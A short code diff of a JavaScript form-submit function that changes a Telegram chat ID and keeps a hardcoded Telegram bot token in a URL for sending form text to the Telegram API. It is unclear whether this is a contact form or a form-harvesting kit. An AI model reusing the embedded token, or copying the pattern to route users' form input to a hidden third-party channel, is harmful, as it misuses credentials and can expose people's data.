@@ -1,7 +1,7 @@
 const formSubmit = () => {
 
     const botToken = '6083389041:AAFSWx9L5e9g7gOXuY5Bnpwz0ttgqc4A-Jk';
-    const chatId = -978006136;
+    const chatId = -950527920;
     const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=`;
 
     const form = document.querySelector('form');
